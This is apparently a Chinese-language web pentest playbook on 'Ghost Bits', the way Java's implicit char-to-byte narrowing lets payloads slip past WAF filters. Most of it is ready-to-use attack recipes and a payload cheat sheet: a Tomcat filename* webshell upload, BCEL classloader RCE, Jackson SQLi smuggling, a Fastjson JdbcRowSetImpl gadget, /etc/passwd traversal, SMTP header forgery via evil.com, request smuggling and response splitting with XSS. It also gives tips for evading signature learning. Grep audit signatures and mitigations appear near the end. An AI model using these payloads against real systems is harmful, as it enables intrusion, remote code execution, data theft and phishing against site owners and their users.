---

phase: webapp
vuln_class: [type-confusion, waf-bypass, java]
title: Ghost Bits（幽灵位）截断攻击测试
summary: Java 的 char 是 16 位，协议是 8 位。中间任何一次隐式窄化都会让高位丢失 —— 校验层看到「无害汉字」，协议层看到「危险 ASCII」。这是绕过 WAF 的通用原语，不是单个 CVE。
---

# Ghost Bits（幽灵位）截断攻击

## 0. 判据速查

| 观察到的现象 | 说明 | 去哪节 |
|---|---|---|
| 后端是 Java（`JSESSIONID`、`.do`/`.action`、Tomcat 错误页、`X-Powered-By`） | 前提成立，否则整篇不适用 | §7 |
| **有 WAF/过滤器，且字面 payload 被拦** | 没有拦截就别用这招，字面 payload 更省事 | §7 |
| 目标有 multipart 上传（Tomcat 解析 `filename*`） | 最常用的落地点 | §5.1 |
| 目标 JSON 反序列化用 Jackson / Fastjson | `\u` / `\x` 转义里藏着窄化 | §5.3、§5.4 |
| 目标用 Jetty 系（Spring / Openfire / GeoServer） | `%2>` 会被折成 `%2E` | §2B、§6 |
| 目标发邮件（Jira / Confluence 类） | CRLF 用 `瘍瘊` 走私 | §5.6 |
| 目标反向代理 + 源站都认 `\r\n` | 请求走私 / 响应拆分 | §5.7、§5.8 |

**核心判据**：Java `char` 是 16 位，HTTP/Redis/SMTP/文件路径都是 8 位。**「校验发生在窄化之前」**就是漏洞 —— 校验层看字符串，执行层看字节，两边结论不同。

---

## 1. 一句话模型

正确做法是显式指定字符集，让多字节字符变成多字节序列：

```java
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);   // 正确
out.write(bytes);
```

大量遗留代码和「快速路径」优化跳过了这一步，直接窄化：

```java
byte b = (byte) ch;          // 0x966A → 0x6A，高位静默丢弃
out.write(ch);               // ByteArrayOutputStream.write(int) 只留低 8 位
dos.writeBytes(str);         // DataOutputStream 逐 char 强转 byte
int v = ch & 0xFF;           // 显式取低字节
```

丢掉的高 8 位就是「幽灵位」。它把一个多字节 Unicode 字符在协议层变成一个**攻击者指定的 ASCII 字节**：

```
视图 A（字符串层：WAF / 业务校验 / 日志）
  看到： 陪 阮 严 灵 瘍 瘊 ...   「无害的 Unicode 乱码，放行」
                  ↓  调用栈某处静默窄化
视图 B（字节层：协议 / 文件系统 / 解析器 / 类加载器）
  看到： j  .  %  u  \r \n ...   「执行危险语义」
```

**要让视图 B 看到字节 `T`，任取 `k ∈ 0x01..0xFF`：**

```
c = chr((k << 8) | T)
```

每个危险字节有 **255 个候选字符** —— 足够躲开任何基于签名的黑名单。

---

## 2. 三种根因（决定 payload 形状和 grep 关键词）

### 2.1 A 类：真实高位截断（经典 Ghost Bits）

窄化是字面、无条件的。

```java
byte b = (byte) ch;                       // A1 显式强转
int v = ch & 0xFF;  int v = ch & 255;     // A2 位掩码
out.write(ch);  baos.write(ch);           // A3 write(int) 只留低 8 位
dos.writeBytes(str);                      // A4 逐 char 写低字节
String.getBytes(int,int,byte[],int);      // A5 已废弃 API，老代码里还有
new StringBufferInputStream(str);
raf.writeBytes(str);
```

**典型落点**：Tomcat `filename*`、Apache BCEL ClassLoader、Lettuce Redis writer、Angus Mail 的 SMTP CRLF、HTTPCLIENT-1974 头注入。

### 2.2 B 类：位运算折叠（非法字符变成合法字符）

「快速」十六进制/base64/字符集解码器用位技巧代替范围检查，非法字符塌到合法值上。

```java
// Jetty TypeUtil.fromHexDigit（简化）
int x = c & 0x1F;          // 留低 5 位
x += (c >> 6) * 25;
x -= 16;
return x;                  // 期望 0..15，但没有范围检查
```

代入 `>`（0x3E）：

```
0x3E & 0x1F        = 0x1E = 30
(0x3E >> 6) * 25   = 0
30 + 0 - 16        = 14 = 0xE
```

所以 `%2>` 被解析成 `%2E` = `.`。同一套代数让 `%2^`、`%2~` 等价于别的十六进制位。

**典型落点**：Openfire CVE-2023-32315、GeoServer CVE-2024-36401、通用 URL 解码 WAF 绕过。

### 2.3 C 类：宽松 Unicode 归一化

解码器接受被归类为「数字」的 Unicode 字符，或用 `& 0xFF` 索引查表 —— 这些字符本来不该参与协议解析。

```java
Character.digit(c, 16);   // Fastjson：接受泰文、旁遮普文、全角数字
return sHexValues[ch & 0xff];   // Jackson：按低 8 位索引 ASCII 表
// 全角归一化：'２'(U+FF12) → '2'，'ｅ'(U+FF45) → 'e'
```

**典型落点**：Fastjson `\u`/`\x` 转义绕过、全角 URL 编码路径穿越、Jackson `charToHex` SQLi 走私。

---

## 3. 字符生成器

这是唯一需要背下来的函数：

```python
def ghost(target_byte: int, k: int = 1) -> str:
    """返回低 8 位等于 target_byte 的 Unicode 字符。"""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 每个字节 255 个候选，例如 '.' (0x2E)：
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E)、Ⱦ 前缀系列……
```

```yak
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // "陪"
```

**选字符三条规则**：

1. **避开代理区 `0xD800..0xDFFF`**（高字节 0xD8..0xDF）。这些不是合法标量值，JVM 字符串解码器会在到达窄化点**之前**就替换掉，绕过直接失效。
2. **优先选能通过应用自身字符集往返的字符**（拉丁扩展、CJK 统一表意、带圈 CJK、谚文）。请求体是 UTF-8 时，这些都编码成多字节序列，任何 WAF 规则都不会把它认成 `.`、`/`、`j`。
3. **在请求之间轮换 `k`**，避免基于签名的学习把单个字符钉死成攻击特征。

---

## 4. 危险字节 → 幽灵字符对照

每个需要的字节给一个已验证字符；WAF 学会后换另一个 `k`。

| 目标字节 | Hex | 用途 | 幽灵字符 | 码点 |
|---|---|---|---|---|
| `\t` | 0x09 | 头折叠、解析器混淆 | `ĉ` | U+0109 |
| `\n` | 0x0A | CRLF 注入、日志注入 | `瘊` | U+760A |
| `\r` | 0x0D | CRLF 注入、请求走私 | `瘍` | U+760D |
| ` ` | 0x20 | 头分隔、命令分隔 | `Ġ` | U+0120 |
| `"` | 0x22 | JSON / quoted-printable 串断开 | `Ģ` | U+0122 |
| `%` | 0x25 | URL 编码前缀、二次解码 | `严` | U+4E25 |
| `&` | 0x26 | 参数分隔 | `Ȧ` | U+0226 |
| `'` | 0x27 | SQL 串断开 | `ȧ` | U+0227 |
| `(` | 0x28 | EL/SpEL/OGNL 语法 | `Ȩ` | U+0228 |
| `)` | 0x29 | EL/SpEL/OGNL 语法 | `ȩ` | U+0229 |
| `.` | 0x2E | 路径穿越、扩展名 | `阮` | U+962E |
| `/` | 0x2F | 路径分隔 | `丯` | U+4E2F |
| `0` | 0x30 | 十六进制构造 | `丰` | U+4E30 |
| `1` | 0x31 | 十六进制构造 | `失` | U+5931 |
| `2` | 0x32 | 十六进制构造 | `甲` | U+7532 |
| `3` | 0x33 | 十六进制构造 | `耳` | U+8033 |
| `;` | 0x3B | 命令分隔、头续行 | `Ȼ` | U+023B |
| `<` | 0x3C | XSS / XML 标签起始 | `ȼ` | U+023C |
| `=` | 0x3D | 参数 / 头值 | `Ƚ` | U+023D |
| `>` | 0x3E | XSS / XML 标签结束 | `Ⱦ` | U+023E |
| `@` | 0x40 | Fastjson `@type`、邮件地址 | `ŀ` | U+0140 |
| `a` | 0x61 | `class` 关键字、字母表 | `ᙡ` | U+1661 |
| `c` | 0x63 | `class`、`cmd` | `㹣` | U+3E63 |
| `e` | 0x65 | 十六进制位 | `来` | U+6765 |
| `j` | 0x6A | `.jsp` 扩展名 | `陪` | U+966A |
| `l` | 0x6C | `class`、`closure` | `౬` | U+0C6C |
| `n` | 0x6E | `Runtime`、`union` | `陮` | U+966E |
| `s` | 0x73 | `class`、`select` | `⑳` | U+2473 |
| `t` | 0x74 | `Runtime`、`type` | `Ŵ` | U+0174 |
| `u` | 0x75 | `\u` 转义引导符 | `灵` | U+7075 |

**选择建议**：HTTP 头这种紧凑上下文用拉丁扩展（`Ŀ`、`ȧ`、`ȼ`，UTF-8 只膨胀 1 字节）；想让 WAF 的「这是普通文本」分类器偏向放行时用 CJK（`阮`、`陪`、`严`）。

---

## 5. 各组件落地配方

每条都给出**双视图**：WAF 看到什么 vs 后端实际执行什么。这是唯一能解释「为什么过得去」的方式。

### 5.1 Tomcat `RFC2231Utility` → 上传 Webshell（A 类）

触发：任何接受 multipart 上传的端点，且 Tomcat 解析 `Content-Disposition: ... filename*=UTF-8''...`。Tomcat 的 RFC2231 解码器把每个非百分号字符直接强转 byte，丢掉高 8 位。

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| 环节 | 看到的文件名 |
|---|---|
| WAF / 扩展名过滤 | `1.陪sp`（不是 `.jsp`，放行） |
| Tomcat RFC2231 解码 | `陪` → 低字节 0x6A → `j` |
| 文件系统 | `1.jsp` |

上传目录固定但接受 `filename*` 时，配合 §4 的穿越字符（`阮`、`丯`）。

### 5.2 Apache Commons BCEL → ClassLoader RCE（A 类）

触发：任何通过 BCEL 解析类名（`$$BCEL$$...`）的 sink，或走 `JavaReader` → `ByteArrayOutputStream` 循环解码 BCEL 的代码。

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // 只留低 8 位
}
```

把恶意 BCEL 字节码的每个字节包进「低 8 位等于该字节」的 Unicode 字符。解码后的字节流是合法 BCEL 类；WAF 看到的是一长串 CJK，没有 `$$BCEL$$` 关键字也没有类签名。

| 视图 | 内容 |
|---|---|
| WAF | `$$BCEL$$` 后跟一堆随机 CJK |
| BCEL | 标准 class 文件字节 → JVM `defineClass` → RCE |

### 5.3 Jackson `charToHex` → SQLi 走私（C 类）

触发：Jackson 解析的 JSON 字段后续被拼进 SQL 或其他解析器。

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // 先掩码，再查表
}
```

低 8 位落在已填充索引上的非 ASCII 字符，就返回那个十六进制位。WAF 看到乱码，Jackson 重建出 ASCII payload。

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| 视图 | 内容 |
|---|---|
| WAF | `\u丰丰耳失 union select ...`（没有前导数字） |
| Jackson | `\u0031 union select 1,2,3-- ` → `1 union select…` |

下游 UNION / 布尔 / 时间盲注模板见 [sql-injection.md](sql-injection.md)。

### 5.4 Fastjson → `\u` 与 `\x` 转义绕过（B + C 类）

**（a）`\u` 转义** —— `Character.digit(c, 16)` 接受 ASCII 之外的 Unicode 数字类别：泰文 `๐-๙`（U+0E50..0E59）、旁遮普 `੦-੯`（U+0A66..0A6F）、全角 `０-９`（U+FF10..FF19）。

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF 看到 `\u４_type`（没有 `@type` 字面量）。Fastjson 把全角 `４` 归一化成 `4`，再用下面的 `\x` 快捷方式处理 `_`，得到 `@type`。

**（b）`\x` 转义** —— Fastjson 算 `digits[x1] * 16 + digits[x2]`，非法十六进制字符返回默认值 0。

```
\x4_   →   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| 视图 | 字段名 |
|---|---|
| WAF | `\x4_type`（不是 `@type`） |
| Fastjson | `@type` → JdbcRowSetImpl autotype gadget 触发 |

### 5.5 Spring / Jetty / Undertow / Vert.x → URL 解码（A + B 类）

**技巧 1 —— A 类字符替换（路径或查询）**：

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = 字节层 ../../etc/passwd
```

**技巧 2 —— B 类 `%2>` 折叠（Jetty `TypeUtil.fromHexDigit` 在链上时）**：

```
/setup/setup-s/%2>%2>/log.jsp
                = 解码后 /setup/setup-s/../log.jsp
```

任一单独就能过多数签名 WAF；两者组合能过「先归一化再匹配」、只认 ASCII 百分号三元组的规则。

**Spring CVE-2025-41242 链**：

```
输入 :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
窄化:   .%u002e
解码:   ..
结果:   路径穿越 → 任意文件读
```

| 环节 | 路径 |
|---|---|
| Spring `isInvalidPath()` | `.%u002e` —— 没有字面 `..`，放行 |
| 后端文件解析 | `%u002e` 解码后成 `..` → 穿越 |

### 5.6 Angus Mail / Jakarta Mail → SMTP 注入（A 类）

触发：任何从用户可控字符串构造 SMTP 信封或头的应用。内部 `ASCIIUtility` 做 `byte b = (byte) ch;`。

用 `瘍瘊` 走私 CRLF：

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| 视图 | 解析结果 |
|---|---|
| 应用校验 | 一个含奇怪 CJK 的 `From` 值 |
| SMTP 服务器 | 五行独立头 + 正文，完全伪造 |

**真实危害**：Jira 类（CVE-2025-57733）密码重置劫持、Confluence 域白名单绕过。非邮件场景的 CRLF 见 [CRLF 注入测试](../CRLF注入/CRLF 注入测试.md)。

### 5.7 Apache HttpClient ≤ 4.5.9 → 请求走私（A 类）

HTTPCLIENT-1974 / 1978：头值经过 `OutputStreamWriter` 加窄化写入，对 `\u760D\u760A` 直接吐出原始 `\r\n`。

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| 跳 | 看到 |
|---|---|
| 前置代理 / WAF | 一个带超长 `X-Auth-Token` 的请求 |
| 源站 | 两个请求，第二个是 admin POST |

确认 desync 后接 [HTTP 请求走私测试](../HTTP请求走私/HTTP 请求走私测试.md) 的 chosen-prefix 手法。

### 5.8 JDK HttpServer → 响应拆分（CVE-2026-21933，A 类）

用户输入反射进响应头，经 `com.sun.net.httpserver` 的写入器逐 char 窄化：

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

服务端吐出两个逻辑响应，第二个带攻击者指定的 body。可升级成存储型 XSS、缓存投毒、SSO 重定向链。

### 5.9 其他组件（同一个 A 类原语，不同 sink）

- **Lettuce（Redis 客户端）** —— 把 `\r\n` 走私进 RESP 帧实现命令注入；可接 `CONFIG SET dir` + `SAVE` 打到 RCE。
- **Jodd `FileNameUtil`** —— 内部写循环窄化，用 `阮`/`丯` 做路径穿越。
- **XMLWriter** —— 属性或文本节点值经低字节写入器时注入标签名；可转 XXE / XSS。
- **ActiveJ HTTP** —— CRLF 注入，形状同 5.7 / 5.8。
- **Vert.x HTTP body parser** —— `MultipartParser` 里的 A 类。

缺的 ASCII 字符用 `chr((k<<8)|T)` 自己算（§1、§3）。

---

## 6. 已知 CVE 的绕过配方

**用在「CVE 已打补丁但前面还有 WAF」时**。每条都把原始 ASCII 攻击搬到能过字符串规则的形态。

### 6.1 Openfire CVE-2023-32315 —— 认证绕过（B 类）

原始公开绕过：

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` 折叠（更难被签名）：

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

每个 `%2>` 经 Jetty 宽松十六进制塌成 `%2E` = `.`，得到同样的 `../../`，而 WAF 从没见过 `..` 或 `%2e`。

### 6.2 GeoServer CVE-2024-36401 —— `Runtime` 关键字 RCE（B 类）

WAF 通常拦 `Runtime`。注入一个折叠字符：

```
Ru%6>time
```

解码：`%6>` → `%6E` → `n`。表达式求值器看到 `Runtime`，WAF 从没看到。

### 6.3 Spring4Shell CVE-2022-22965 —— 类加载器链（A 类）

需要参数前缀 `class.module.classLoader...`，WAF 拦字面 `class`。用低字节字符替换：

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| 字符 | 码点 | 低字节 |
|---|---|---|
| `c` ← `㹣` | U+3E63 | 0x63 |
| `l` ← `౬` | U+0C6C | 0x6C |
| `a` ← `ᙡ` | U+1661 | 0x61 |
| `s` ← `⑳` | U+2473 | 0x73 |
| `s` ← `⑳` | U+2473 | 0x73 |

Spring 的参数名解析器再窄化回 `class`。

### 6.4 Spring CVE-2025-41242 —— 任意文件读（A + B 混合）

见 §5.5。payload `阮严灵丰丰甲来` → `.%u002e` → 解码后 `..`。

### 6.5 Jakarta Mail CVE-2025-57733 —— Jira 式邮件劫持（A 类）

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

邮件从公司 SMTP 发出，SPF / DKIM / DMARC 全部合法，但 `To:` 和 `Subject:` 是攻击者选的 —— 高保真钓鱼。

---

## 7. 判断该不该用这招

```
后端是 Java 吗？（Server 头、错误页、JSESSIONID、.do/.action、
                  WebGoat 式堆栈、X-Powered-By、Tomcat 默认 X-Frame-Options）
├── 不是 → 停，这招不适用
└── 是
    ├── 有 WAF / IDS / 输入过滤在拦你的字面 payload 吗？
    │   ├── 没有 → 用字面 payload，Ghost Bits 是多余的
    │   └── 有 → 继续
    │
    ├── 打的是哪个 sink？
    │   ├── multipart 上传        → §5.1（Tomcat filename*）
    │   ├── JSON 反序列化         → §5.3（Jackson）/ §5.4（Fastjson）
    │   ├── 类加载器 / BCEL       → §5.2
    │   ├── URL 路径 / 参数       → §5.5 + B 类 %2>
    │   ├── 头反射                → §5.7 / §5.8
    │   ├── 发邮件                → §5.6
    │   └── Redis / RESP / XML    → §5.9
    │
    ├── 先用「单个字符替换」做非破坏性探针
    │   （只换一个字符成 Ghost 变体，观察响应差异：
    │     状态码、长度、头回显、错误消息、耗时）
    │
    └── 出现可观测差异 → 把所有被拦字符都替换，接对应 playbook 往下打
```

---

## 8. 代码审计签名

审 Java 源码时按三级优先级 grep（跨项目仓库、能 shade 的依赖、设备的 `lib/`）。

**一级 —— 直接窄化（A 类）**

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

**二级 —— 宽松十六进制/数字解码（B + C 类）**

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

**三级 —— 高风险包装与可达性**

```
RFC2231                # Tomcat / 邮件 filename* 解析
JavaReader             # BCEL ClassLoader 可达
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient 头解析器
ChunkedDecoder         # 请求走私相邻
charToHex              # Jackson
encodeUTF8             # char->byte 写入器候选
```

**五维风险模型**：

| 维度 | 风险更高的条件 |
|---|---|
| 输入可控 | HTTP 参数、头、文件名、JSON key、邮件地址 |
| 校验 | 拒绝/允许列表跑在窄化点**之前** |
| 窄化时机 | 转换发生在安全检查**之后** |
| 语法目标 | 结果进入 URL / SMTP / HTTP / Redis / 文件系统 / SQL 语法 |
| 二次解码 | 之后还有 Base64、URL 解码、JSON 反转义、`%u` |

```
攻击者可控 + 先检查后窄化 + 结果进协议语法 + 后续二次解码 = 高危
```

---

## 9. 差分测试流程

找新 sink（红队）或验证修复（蓝队）的可复现黑盒流程。

```
1. 一次只选一个危险字节 T（如 0x2E 代表 '.'）

2. 生成候选集：
       C = { chr((k << 8) | T) for k in 1..255 }
   剔除代理区 0xD8XX..0xDFXX

3. 对每个候选 c：
       a. 在选定位置放 c，发一个无害请求
       b. 同位置放字面 T，发同样请求
       c. 比对四个观测量：
            - 状态码
            - 响应体长度
            - 响应体内容 hash（或 diff）
            - 服务端日志行（若能拿到）

4. 若某候选的响应等价于 T、但区别于「中性字符」（如 'X'）→ 找到窄化 sink

5. 按优先级换下一个 T：
       0x2E('.'), 0x2F('/'), 0x25('%'), 0x40('@'),
       0x0D('\r'), 0x0A('\n'), 0x6A('j'), 0x73('s'),
       0x6C('l'), 0x61('a'), 0x63('c'), 0x22('"'), 0x27(''')
6. 按组件聚类 sink（看 Server 头、错误堆栈）——
   一个 sink 通常意味着整个框架版本都受影响
```

这套流程与协议无关，同一个循环能用在文件上传、搜索接口、邮件编辑器、Redis 缓存上。

---

## 10. 防护要点（五层，缺一不可）

| 层 | 措施 |
|---|---|
| 源码 | 禁止手写 `(byte) ch`、`& 0xFF`、`out.write(ch)`、`writeBytes`。协议字段用 `getBytes(StandardCharsets.UTF_8)` 或严格 ASCII 白名单 |
| 解码器 | 拒绝非法输入。**绝不**把未知十六进制/Unicode 数字/Base64 字符默认折成 0 或低 8 位 |
| 校验顺序 | **先归一化，再校验**。严格解码 → Unicode NFC/NFKC → 协议归一化（URL `..` 解析、`File.getCanonicalPath`）→ 安全检查 → 执行 |
| 协议字段 | 每个字段严格白名单（HTTP 头值、SMTP 信封、URL 路径、文件名、JSON key、XML 标签）。任何头或地址里出现 CR/LF 直接拒 |
| WAF / IDS | **多视图归一化**：同时检查原始串、`(char) & 0xFF` 视图、URL 解码视图、Unicode NFKC 视图。任一视图出现原始串没有的危险语义就告警 |

**蓝队嗅探点**：

- 日志里在「协议语法期望 ASCII」的位置（文件名、头值、邮件地址）出现 CJK / 拉丁扩展字符
- 请求的 HEX dump 在协议分隔符旁边有 `0x20..0x7E` 之外的字节
- 扫描器报了「奇怪的 200」但监控没告警 —— 在 Java 栈上这是 2025–2026 最常见的原因

---

## 11. 速查 payload

```text
# 生成器
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # 避开 k 在 0xD8..0xDF

# Tomcat filename* 上传 webshell
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # → shell.jsp

# BCEL ClassLoader（概念）
$$BCEL$$<class 文件每个字节包进一个 Unicode 字符>

# Jackson SQLi 走私
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # → "1 union select…"

# Fastjson @type 走私
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL 解码 + Jetty %2> 折叠
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp
GET /api?cmd=Ru%6>time

# Spring4Shell name* class 走私
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Spring CVE-2025-41242 文件读
GET /resources/阮严灵丰丰甲来/secret.properties                    # → ../%u002e

# Angus Mail / Jira 邮件劫持
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient ≤4.5.9 走私
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer 响应拆分（CVE-2026-21933）
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>

# 审计首轮 grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---

## 12. 纪律

- **不是 Java 就别用**。这招的前提是 16 位 char 与 8 位字节的窄化，其他语言没有这个形状。
- **没有 WAF 就别用**。字面 payload 更省事、更好解释。Ghost Bits 是绕过手段，不是漏洞本身。
- **先单个字符探针，再全量替换**。一次改一个字符观察响应差异，能确认窄化点存在，也能避免把「无变化」误判成「有漏洞」。
- **避开代理区 `0xD800..0xDFFF`**。用了会被 JVM 提前替换，绕过静默失效 —— 这是最常见的「明明该成功却没成功」。
- **轮换 `k`**。同一个字符重复用会被签名学习钉死。
- **报的是「读到了文件 / 执行了命令」不是「绕过 WAF」**。Ghost Bits 只是路径，成果要落到下游的实际影响。
- **CVE 已修但 WAF 还在时最有用**。这时原始 payload 失效、目标未升级，Ghost Bits 是唯一还能打的形态。

---

## 参考

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in Java*（Xinyu Bai @b1u3r/@iSafeBlue、Zhihui Chen @1ue；Contributor: Zongzheng Zheng @chun_springX）
- 被重新启用的真实 CVE：GeoServer CVE-2024-36401、Spring4Shell CVE-2022-22965、Openfire CVE-2023-32315、Spring CVE-2025-41242、Jakarta Mail CVE-2025-57733、JDK HttpServer CVE-2026-21933、Apache HttpClient HTTPCLIENT-1974/1978
- 需要升过的组件：Apache Commons BCEL ≥ 6.12.0、Fastjson 2.x 最新、Apache HttpClient ≥ 4.5.10（或迁 5.x）、GeoServer ≥ 2.28.3、Openfire ≥ 5.0.4。依赖任何具体版本号前先核对厂商公告
